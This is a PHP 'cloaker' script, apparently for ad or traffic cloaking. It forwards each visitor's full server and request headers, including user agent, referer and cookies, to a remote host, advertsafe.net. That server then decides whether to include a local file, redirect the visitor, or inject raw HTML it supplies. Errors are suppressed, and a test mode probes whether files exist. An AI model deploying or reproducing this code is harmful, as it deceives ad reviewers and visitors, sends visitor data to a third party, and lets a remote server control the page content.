<?php
error_reporting(0);
class cloaker{
	public function __construct(){
        $this->defaultHeaders();
		if(isset($_GET['test'])){
        	if($_GET['test']=='true'){
            	$this->test_execute();
                die();
            }
        }
        if (!function_exists('curl_init')) {
			print_r("You haven't the curl_init library");
			return;
        }
		$resultObj = (object) array('result' => false);
		$url = "http://advertsafe.net/cloaker/cloaker.php?id=a44f4bd7afe14c3d3ac304add5cb766c&c=0667538595b1f23298435aa4ed959ac9";
        $ch = curl_init($url);
        $headers=array();
		
        foreach($_SERVER as $key=>$normalizedValue){
            if(is_array($normalizedValue)){
                $normalizedValue = implode(',', $normalizedValue);
            }
            $normalizedValue = trim(preg_replace('/\s+/', ' ', $normalizedValue));
            $smallHeader=strlen($normalizedValue)<1000;
            if ($smallHeader || $key == 'HTTP_USER_AGENT' || $key == 'HTTP_REFERER' || $key == 'QUERY_STRING' || $key == 'REQUEST_URI') {
                //if($key=="HTTP_USER_AGENT") $headers[] = 'Impo_'.$key.': facebook';
				/*else */$headers[] = 'Impo_'.$key.': '.$normalizedValue;
            } else {
                $headers[] = 'Other_'.$key.': skipped because had size '.strlen($normalizedValue);
            }
        }
		curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        
        $output = json_decode(curl_exec($ch));
        $curl_error_number = curl_errno($ch);

        curl_close($ch);
		switch($output->code){
			case 0:
				$this->include_page($output->page);
            break;
           	case 1:
				$this->redict($output->page);
            break;
            case 2:
				$this->html_page($output->page);
            break;
		}

	}
	
	function defaultHeaders(){
        header("Cache-Control: no-cache, private, must-revalidate");
        header("Pragma: no-cache");
        header("Expires: 0");
    }
	function include_page($link){
		if($link){
			if(file_exists($link)){
				include($link);
			}else $this->error("File not exist(check the link)");
		}else $this->error("You have not permission");
	}
    function redict($link){
		if(strlen($_SERVER['QUERY_STRING'])>1){
			header("Location: ".$link."?".$_SERVER['QUERY_STRING']);
		}else{
			header("Location: ".$link);
		}
    }
    function html_page($cont){
    	echo $cont;
    }
	function error($err){
		echo "Error: ".$err;
	}
    function test_execute(){
    	$arr['test']=true;
        if(isset($_GET['safe_page'])){
			$safe=json_decode($_GET['safe_page'],true);
			foreach($safe as $k=>$v){
				if(!file_exists($v)){
					$arr['test']=false;
					$arr['safe']='false';
				}
			}
        }
        if(isset($_GET['main_page'])){
			$main=json_decode($_GET['main_page'],true);
			foreach($main as $k=>$v){
				if(!file_exists($v)){
					$arr['test']=false;
					$arr['main']='false';
				}
			}
        }
        echo json_encode($arr);
    }
}
$cl= new cloaker();
?>